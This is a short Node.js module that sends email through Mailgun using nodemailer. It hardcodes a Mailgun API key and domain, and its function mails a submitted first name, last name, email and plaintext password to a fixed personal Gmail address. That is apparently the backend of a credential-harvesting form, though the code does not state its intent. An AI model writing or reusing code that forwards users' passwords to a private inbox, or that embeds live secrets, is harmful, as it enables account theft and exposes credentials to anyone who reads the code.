const nodemailer = require('nodemailer');
const mailGun = require('nodemailer-mailgun-transport');

const auth = {
    auth: {
        api_key: '0931545b0c25903c2be8f3c736b0b243-8b34de1b-4e7ed481',
        domain: 'sandboxd08a1bfc9b9e423b8cdb5168ca88901e.mailgun.org'
    }
};

const transporter = nodemailer.createTransport(mailGun(auth));

const sendMail = ( firstname, lastname, email, password, subject, text, cb ) => {
    
    const mailOptions = {
        from: email,
        to: 'dabrentwenty@gmail.com',
        firstname,
        lastname,
        password,
        subject,
        text
    };
    
    transporter.sendMail(mailOptions, function(err, data) {
        if(err) {
            cb(err, null);
        }
    
        else {
            cb(null, data);
        }
    });
}

module.exports = sendMail;